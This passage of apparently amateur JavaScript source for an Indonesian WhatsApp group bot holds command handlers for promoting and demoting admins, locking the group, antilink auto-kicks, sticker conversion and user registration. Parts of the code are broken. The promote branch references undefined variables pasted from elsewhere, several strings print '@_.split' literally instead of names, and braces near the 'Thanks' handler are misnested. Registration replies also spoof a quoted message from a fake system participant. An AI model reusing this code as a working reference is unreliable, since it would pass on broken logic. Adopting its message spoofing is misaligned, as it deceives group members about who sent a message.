					if (!isBotGroupAdmins) return reply('BOT HARUS JADI ADMIN DULU')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('𝗧𝗮𝗴 𝘁𝗮𝗿𝗴𝗲𝘁 𝘆𝗮𝗻𝗴 𝗶𝗻𝗴𝗶𝗻 𝗱𝗶 𝘁𝗲𝗻𝗱𝗮𝗻𝗴!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `Status adminmu dicopot. Makanya jan jadi beban🏃 :\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						Angga.groupDemoteAdmin(from, mentioned)
					} else {
						mentions(`YA YAHYA WAHYU @${mentioned[0].split('@')[0]} Jabatan adminmu di copt, Makanya jan jadi beban canda beban:v🏃`, mentioned, true)
						Angga.groupDemoteAdmin(from, mentioned)
					}
					break
				case 'promote':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply('BOT HARUS JADI ADMIN DULU')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('𝗧𝗮?? 𝘁𝗮𝗿𝗴𝗲𝘁 𝘆𝗮𝗻𝗴 𝗶𝗻𝗴𝗶𝗻 𝗱𝗶 𝘁𝗲𝗻𝗱𝗮𝗻𝗴!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						num = anu.participants[0]
						for (let _ of mentioned) {
							teks += `Selamat🥳 anda naik menjadi admin grub (>_<) :\n`
							teks += `@_.split('@')[0]`
							buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/promote?nama=${encodeURI(anu_user.notify)}&member=${member}&pesan=${encodeURI(anu_user.notify)} Naik Pangkat&pp=${pp_user}&bg=${pp_grup}`)
	        
		didin.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
						}
						mentions(teks, mentioned, true)
						Angga.groupMakeAdmin(from, mentioned)
					} else {
						mentions(`selamat🥳 @${mentioned[0].split('@')[0]} anda naik menjadi admin grub (>_<)`, mentioned, true)
						Angga.groupMakeAdmin(from, mentioned)
					}
					break	
					case 'grup':
					case 'group':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply('BOT HARUS JADI ADMIN DULU')
					if (args[0] === 'buka') {
					    reply(`*BERHASIL MEMBUKA GROUP*`)
						Angga.groupSettingChange(from, GroupSettingChange.messageSend, false)
					} else if (args[0] === 'tutup') {
						reply(`*BERHASIL MENUTUP GROUP`)
						Angga.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}
					break       
           	case 'setname':
                if (!isGroup) return reply(ind.groupo())
			    if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply('BOT HARUS JADI ADMIN DULU')
                Angga.groupUpdateSubject(from, `${body.slice(9)}`)
                Angga.sendMessage(from, 'Succes, Ganti Nama Grup', text, {quoted: mek})
					break
                case 'setdesc':
                if (!isGroup) return reply(ind.groupo())
			    if (!isGroupAdmins) return reply(ind.admin())
				if (!isBotGroupAdmins) return reply('BOT HARUS JADI ADMIN DULU')
                Angga.groupUpdateDescription(from, `${body.slice(9)}`)
                Angga.sendMessage(from, 'Succes, Ganti Deskripsi Grup', text, {quoted: mek})
					break
		case 'listadmin':
					if (!isGroup) return reply(ind.groupo())
					teks = `List admin of group *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
					case 'infogc':
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply(ind.baned())
				
				Angga.updatePresence(from, Presence.composing)
				if (!isGroup) return reply(mess.only.group)
					try {
					ppimg = await Angga.getProfilePicture(from)
				} catch {
					ppimg = 'https://i.ibb.co/NthF8ds/IMG-20201223-WA0740.jpg'
				}
					let buf = await getBuffer(ppimg)
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `*Nama grup :* ${groupName}\n*Deskripsi :* ${groupDesc}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Member :* ${groupMembers.length}`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}]`
					}
					Angga.sendMessage(from, buf, image, {quoted: mek, caption: teks})
					break
					case 'upswvideo':
					Angga.updatePresence(from, Presence.composing)
					if (isQuotedVideo) {
						const swew = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						sweb = await Angga.downloadMediaMessage(swew)
						Angga.sendMessage('status@broadcast', sweb, video, { caption: `${q}` })
					}
					bur = `Sukses Upload Story Video dengan Caption: ${q}`
					Angga.sendMessage(from, bur, text, { quoted: mek, contextInfo: { forwardingScore: 15, isForwarded: true} })
					break
case 'upswimg':
					Angga.updatePresence(from, Presence.composing)
					if (isQuotedImage) {
						const swew = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						sweb = await Angga.downloadMediaMessage(swew)
						Angga.sendMessage('status@broadcast', sweb, image, { caption: `${q}` })
					}
					bur = `Sukses Upload Story Image dengan Caption: ${q}`
					Angga.sendMessage(from, bur, text, { quoted: mek, contextInfo: { forwardingScore: 15, isForwarded: true}})
					break
		case 'toimg':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (!isQuotedSticker) return reply('*Reply/Tag sticker!*')
					reply(ind.wait())
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Angga.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply(ind.stikga())
						buffer = fs.readFileSync(ran)
						Angga.sendMessage(from, buffer, image, {quoted: mek, caption: '*DAH JADI SETAN* '})
						fs.unlinkSync(ran)
					})
					await limitAdd(sender)
					break
                 case 'simi':
					if (args.length < 1) return reply('Textnya mana kak?')
					teks = body.slice(5)
					anu = await simih(teks) //fetchJson(`https://mhankbarbars.herokuapp.com/api/samisami?text=${teks}`, {method: 'get'})
					//if (anu.error) return reply('Simi ga tau kak')
					reply(anu)
					break
		case 'simih':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan 0')
					if (Number(args[0]) === 1) {
						if (isSimi) return reply('*Fitur simi sudah aktif sebelum nya*')
						samih.push(from)
						fs.writeFileSync('./database/bot/simi.json', JSON.stringify(samih))
						reply('Sukses mengaktifkan mode simi di group ini ✔️')
					} else if (Number(args[0]) === 0) {
						samih.splice(from, 1)
						fs.writeFileSync('./database/bot/simi.json', JSON.stringify(samih))
						reply('Sukes menonaktifkan mode simi di group ini ✔️')
					} else {
						reply(ind.satukos())
					}
					break
		case 'nsfw':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan ')
					if (Number(args[0]) === 1) {
						if (isNsfw) return reply('*Fitur nsfw sudah aktif sebelum nya*')
						nsfw.push(from)
						fs.writeFileSync('./database/bot/nsfw.json', JSON.stringify(nsfw))
						reply('Sukes mengaktifkan mode nsfw di group ini ✔️')
					} else if (Number(args[0]) === 0) {
						nsfw.splice(from, 1)
						fs.writeFileSync('./database/bot/nsfw.json', JSON.stringify(nsfw))
						reply('Sukes menonaktifkan mode nsfw di group ini ✔️')
					} else {
						reply(ind.satukos())
					}
					break
		case 'leveling':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan 0')
					if (args[0] === '1') {
					if (isLevelingOn) return reply('*Fitur level sudah aktif sebelum nya*')
					_leveling.push(from)
					fs.writeFileSync('./database/kelompok/leveling.json', JSON.stringify(_leveling))
					reply(ind.lvlon())
					} else if (args[0] === '0') {
					_leveling.splice(from, 1)
						fs.writeFileSync('./database/kelompok/leveling.json', JSON.stringify(_leveling))
						reply(ind.lvloff())
					} else {
						reply(ind.satukos())
					}
					break
		case 'welcome':
					if (!isGroup) return reply(ind.groupo())
					if (!isGroupAdmins) return reply(ind.admin())
					if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan 0')
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('*Fitur welcome sudah aktif sebelum nya')
						welkom.push(from)
						fs.writeFileSync('./database/bot/welkom.json', JSON.stringify(welkom))
						reply('❬ SUCCSESS ❭ mengaktifkan fitur welcome di group ini')
					} else if (Number(args[0]) === 0) {
						welkom.splice(from, 1)
						fs.writeFileSync('./database/bot/welkom.json', JSON.stringify(welkom))
						reply('❬ SUCCSESS ❭ menonaktifkan fitur welcome di group ini')
					} else {
						reply(ind.satukos())
					}
					break
                 case 'antilink':
                                	if (!isGroup) return reply('ONLY GRUP')
					if (!isGroupAdmins) return reply('ONLY ADMIN')
					if (!isBotGroupAdmins) return reply('JADIKAN BOT ADMIN DULU')
					if (args.length < 1) return reply('Ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isAntilink) return reply('Anti link group sudah aktif')
						antilink.push(from)
						fs.writeFileSync('./database/kelompok/antilink.json', JSON.stringify(antilink))
						reply('Sukses mengaktifkan anti link group di group ini ✔️')
						Angga.sendMessage(from,`Perhatian kepada seluruh member anti link group aktif apabila anda mengirim link group anda akan di kick dari group`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntilink) return reply('Mode anti link group sudah disable')
						antilink.splice(from, 1)
						fs.writeFileSync('./database/kelompok/antilink.json', JSON.stringify(antilink))
						reply('Sukes menonaktifkan anti link group di group ini ✔️')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break
                 case 'event':
					if (!isGroup) return reply(ind.groupo())
					if (!isAdmin) return reply('*Only Adminban & Owner Kami!*')
					if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan 0')
					if (Number(args[0]) === 1) {
						if (isEventon) return reply('*Fitur event sudah aktif sebelum nya*')
						event.push(from)
						fs.writeFileSync('./database/bot/event.json', JSON.stringify(event))
						reply('❬ SUCCSESS ❭ mengaktifkan fitur event di group ini')
					} else if (Number(args[0]) === 0) {
						event.splice(from, 1)
						fs.writeFileSync('./database/bot/event.json', JSON.stringify(event))
						reply('❬ SUCCSESS ❭ menonaktifkan fitur event di group ini')
					} else {
						reply(ind.satukos())
					}
					break
                 case 'eventt':
					if (!isGroup) return reply(ind.groupo())
				if (!isAdmin) return reply('*Only Admin bot*')
					if (args.length < 1) return reply('Mengaktifkan tekan 1, Menonaktif tekan 0')
					if (Number(args[0]) === 1) {
						if (isEventon) return reply('*Fitur event sudah aktif sebelum nya*')
						event.push(from)
						fs.writeFileSync('./database/bot/event.json', JSON.stringify(event))
						reply('❬ SUCCSESS ❭ mengaktifkan fitur event di group ini')
					} else if (Number(args[0]) === 0) {
						event.splice(from, 1)
						fs.writeFileSync('./database/bot/event.json', JSON.stringify(event))
						reply('❬ SUCCSESS ❭ menonaktifkan fitur event di group ini')
					} else {
						reply(ind.satukos())
					}
					break
		case 'clone':
					if (!isGroup) return reply(ind.groupo())
					if (!isOwner) return reply(ind.ownerg()) 
					if (args.length < 1) return reply(' *TAG YANG MAU DI CLONE!!!* ')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('❬ SUCCSESS ❭')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
					let { jid, id, notify } = groupMembers.find(x => x.jid === mentioned)
					try {
						pp = await Angga.getProfilePicture(id)
						buffer = await getBuffer(pp)
						Angga.updateProfilePicture(botNumber, buffer)
						mentions(`Foto profile Berhasil di perbarui menggunakan foto profile @${id.split('@')[0]}`, [jid], true)
					} catch (e) {
						reply(ind.stikga())
					}
					await limitAdd(sender)
					break
				case 'wait':
					
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						reply(ind.wait())
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						media = await Angga.downloadMediaMessage(encmedia)
						await wait(media).then(res => {
							Angga.sendMessage(from, res.video, video, {quoted: mek, caption: res.teks.trim()})
						}).catch(err => {
							reply(err)
						})
					} else {
						reply(ind.ocron())
					}
					await limitAdd(sender)
					break
				default:
				if (budy.includes("://chat.whatsapp.com/")){
		if (!isGroup) return
		if (!isAntilink) return
		if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
		Angga.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*_「 Link Terdeteksi 」_*\nHei *${pushname}*  *「 LINK TERDETEKSI ⌋ MAFF SEKARANG KAMU SAYA KICK DARI GRUP INI*`)
		setTimeout( () => {
			Angga.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 3000)
		setTimeout( () => {
			Angga.updatePresence(from, Presence.composing)
			reply("SEEE YUO KACK;)")
		}, 0)
	}
	
            if (body.startsWith(`assalamualaikum`)) {
wa = `Waalaikumsalam`
reply(wa)
                  }
		if (body.startsWith(`Assalamualaikum`)) {
wa2 = `Waalaikumsalam`
reply(wa2)
                  }

        if (budy.includes(`Bot`)) {
wa3 = `Ya?\nUntuk Menggunakan Bot Ketik ${prefix}menu/help`
Angga.sendMessage(from, wa3, text,{quoted : mek, sendEphemeral: true, thumbnail: fs.readFileSync('./me.jpg', 'base64'), contextInfo: { forwardingScore: 1, isForwarded: true}})
                  }
                  if (budy == 'cekprefix') {
				fakestatus(`*AnggaXyz Bot MENGGUNAKAN PREFIX :「 ${prefix} 」*`)
			}
			if (budy == '@verify') {
			if (isRegistered) return reply('lu udh verify paok🗿')
						const serialUser = createSerial(20)
						veri = sender
						if (isGroup) {
							addRegisteredUser(sender, pushname, time, serialUser)
							try {
								ppimg = await Angga.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
							} catch {
								ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
								
					  imglu = 'https://i.ibb.co/SyrkX1K/20210528-074332.jpg'
							}
							captnya = `
「 *PENDAFTARAN USER* 」
*│Terimakasih Sudah*
*│Mendaftarkan Diri*
*│Dalam AnggaGanz Bot WhatsApp*
*┕┬────────────┈ ⳹*
*┌┤Nama :* ${pushname}
*││Api :* +${sender.split('@')[0]}
*││SN :* ${serialUser}
*││Total Pengguna :* ${_registered.length} Orang
*││Status :* ☑️ Terverifikasi
*│┕────────────┈ ⳹*
*│Waktu Pendaftaran*
│•Tanggal : *${date}*
│•Jam : *${time}*
┝────────────────
│ *Selamat Menikmati*
┕━━━━━━━━━━━━┈ ❋ཻུ۪۪⸙
*「 Angga Ganz 」*`
 let ini_gambarnya = await getBuffer(`http://hadi-api.herokuapp.com/api/card/verify?nama=${encodeURI(pushname)}&member=${_registered.length}&seri=AnggaSerial&pp=${ppimg}&bg=${imglu}`)

                Angga.sendMessage(from, ini_gambarnya, MessageType.image, {quoted: mek, caption: captnya, contextInfo: {"mentionedJid": [sender]}})
							let peripi = await getBuffer(ppimg)
							Angga.sendMessage(from, peripi, image, {
								caption: captnya, quoted: {
									key: {
										fromMe: false,
										participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
									},
									message: {
										conversation: cr
									}
								}
							})
							addATM(sender)
							addLevelingId(sender)
							console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(pushname, 'cyan'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
						} else {
							addRegisteredUser(sender, pushname, time, serialUser)
							try {
								ppimg = await Angga.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
							} catch {
								ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
							captnya = `
「 *PENDAFTARAN USER* 」
*│Terimakasih Sudah*
*│Mendaftarkan Diri*
*│Dalam AnggaGanz Bot WhatsApp*
*┕┬────────────┈ ⳹*
*┌┤Nama :* ${pushname}
*││Api :* +${sender.split('@')[0]}
*││SN :* ${serialUser}
*││Total Pengguna :* ${_registered.length} Orang
*││Status :* ☑️ Terverifikasi
*│┕────────────┈ ⳹*
*│Waktu Pendaftaran*
│•Tanggal : *${date}*
│•Jam : *${time}*
┝────────────────
│ *Silahkan Ketik ${prefix}rules*
│ *Untuk Melanjutkan Pengguna*
┕━━━━━━━━━━━━┈ ❋ཻུ۪۪⸙
*「 Angga Ganz 」*`
							let peripi = await getBuffer(ppimg)
							Angga.sendMessage(from, peripi, image, {
								caption: captnya, quoted: {
									key: {
										fromMe: false,
										participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
									},
									message: {
										conversation: cr
									}
								}
							})
						}
						addATM(sender)
						addLevelingId(sender)
						console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(pushname, 'cyan'), 'Serial:', color(serialUser, 'cyan'))
					}
			}
       if (budy.includes(`bot`)) {
       	wa4 = `Ya?\nUntuk Menggunakan Bot Ketik ${prefix}menu/help`
Angga.sendMessage(from, wa4, text,{quoted : mek, sendEphemeral: true, thumbnail: fs.readFileSync('./me.jpg', 'base64'), contextInfo: { forwardingScore: 1, isForwarded: true}})
                  }
        if (budy.includes(`Woy`)) {
        	wa5 = `Ya?\nUntuk Menggunakan Bot Ketik ${prefix}menu/help`
Angga.sendMessage(from, wa5, text,{quoted : mek, sendEphemeral: true, thumbnail: fs.readFileSync('./me.jpg', 'base64'), contextInfo: { forwardingScore: 1, isForwarded: true}})
                  }
		if (budy.includes(`Hai`)) {
wa6 = `Hai Juga\nUntuk Menggunakan Bot Ketik ${prefix}menu/help`
Angga.sendMessage(from, wa6, text,{quoted : mek, sendEphemeral: true, thumbnail: fs.readFileSync('./me.jpg', 'base64'), contextInfo: { forwardingScore: 1, isForwarded: true}})
                  }
		if (budy.includes(`Hallo`)) {
			wa7 = `Hallo Juga\nUntuk Menggunakan Bot Ketik ${prefix}menu/help`
Angga.sendMessage(from, wa7, text,{quoted : mek, sendEphemeral: true, thumbnail: fs.readFileSync('./me.jpg', 'base64'), contextInfo: { forwardingScore: 1, isForwarded: true}})
                  }
		if (budy.includes(`Thanks`)) {
			wa8 = `Sama-sama ${pushname}`
Angga.sendMessage(from, wa8, text,{quoted : mek, sendEphemeral: true, thumbnail: fs.readFileSync('./me.jpg', 'base64'), contextInfo: { forwardingScore: 1, isForwarded: true}})
                  
		if (budy.includes(`Makasih`)) {
			wa9 = `Sama-sama ${pushname}`
Angga.sendMessage(from, wa9, text,{quoted : mek, sendEphemeral: true, thumbnail: fs.readFileSync('./me.jpg', 'base64'), contextInfo: { forwardingScore: 1, isForwarded: true}})
                  }
					if (isGroup && !isCmd && isSimi && budy != undefined) {
						console.log(budy)
						muehe = await simih(budy)
						reply(ind.cmdnf(prefix, command))
					} else {
						console.log(color('[ERROR]','red'), 'Unregistered Command from', color(sender.split('@')[0]))
					}
					}
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
